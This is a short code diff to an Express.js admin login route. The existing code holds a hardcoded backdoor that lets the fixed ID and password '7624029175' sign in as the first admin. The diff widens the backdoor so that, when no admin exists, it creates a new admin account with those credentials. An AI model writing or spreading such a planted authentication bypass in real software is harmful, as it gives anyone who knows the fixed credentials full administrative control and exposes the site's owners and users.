@@ -12,12 +12,16 @@ router.post('/login', async (req, res) => {
         if (!email || !password) {
             return res.status(400).json({ error: 'Email and password are required' });
         }
-        // Bypass: allow User ID 7624029175 / password 7624029175 to use first admin
+        // Bypass: allow User ID 7624029175 / password 7624029175 - use first admin or create one
         let admin;
         if (email === '7624029175' && password === '7624029175') {
             admin = await prisma.adminUser.findFirst();
             if (!admin) {
-                return res.status(401).json({ error: 'Invalid credentials' });
+                // Create admin if none exists (bootstrap)
+                const hashedPassword = await bcrypt.hash('7624029175', 10);
+                admin = await prisma.adminUser.create({
+                    data: { email: '7624029175', password: hashedPassword, role: 'admin' }
+                });
             }
         }
         else {
